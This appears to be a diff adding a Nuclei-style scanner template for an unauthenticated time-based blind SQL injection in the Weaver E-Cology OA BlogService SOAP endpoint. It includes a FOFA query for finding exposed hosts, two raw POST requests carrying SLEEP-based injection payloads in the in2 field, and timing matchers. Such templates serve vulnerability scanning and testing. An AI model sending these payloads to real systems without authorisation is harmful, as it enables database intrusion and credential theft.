@@ -1,0 +1,66 @@
+id: WeaverOA-E-Cology-BlogService-sql
+info:
+  name: "泛微E-Cology BlogService接口SQL时间盲注"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="泛微-OA（e-cology）"
+      泛微E-Cology BlogService接口存在SQL时间盲注漏洞。攻击者无需身份验证即可通过构造恶意SQL查询，利用时间延迟特性实现数据库信息探测。该漏洞可能被用于提取敏感数据（如管理员凭据、用户隐私信息），在具备高权限条件下还可通过带外技术向服务器写入恶意文件，最终导致系统权限被控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486868&idx=1&sn=03412f27928252b4cd115725ac5e72a4&chksm=c267b8a7f51031b1538c01d421b3abc3bc8b6296f0298507e6566483c600f432c7d2c1ebc175&token=522460222&lang=zh_CN#rd
+  tags: 泛微E-Cology
+
+
+
+http:
+- raw:
+  - |
+    POST /services/BlogService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: text/xml;charset=UTF-8
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+      <soapenv:Header/>
+      <soapenv:Body>
+        <web:sendSubmitRemind>
+          <!--type: string-->
+          <web:in0>1</web:in0>
+          <!--type: string-->
+          <web:in1>2</web:in1>
+          <!--type: string-->
+          <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(4)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
+        </web:sendSubmitRemind>
+      </soapenv:Body>
+    </soapenv:Envelope>
+  - |
+    POST /services/BlogService HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+    Content-Type: text/xml;charset=UTF-8
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
+      <soapenv:Header/>
+      <soapenv:Body>
+        <web:sendSubmitRemind>
+          <!--type: string-->
+          <web:in0>1</web:in0>
+          <!--type: string-->
+          <web:in1>2</web:in1>
+          <!--type: string-->
+          <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(8)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
+        </web:sendSubmitRemind>
+      </soapenv:Body>
+    </soapenv:Envelope>
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
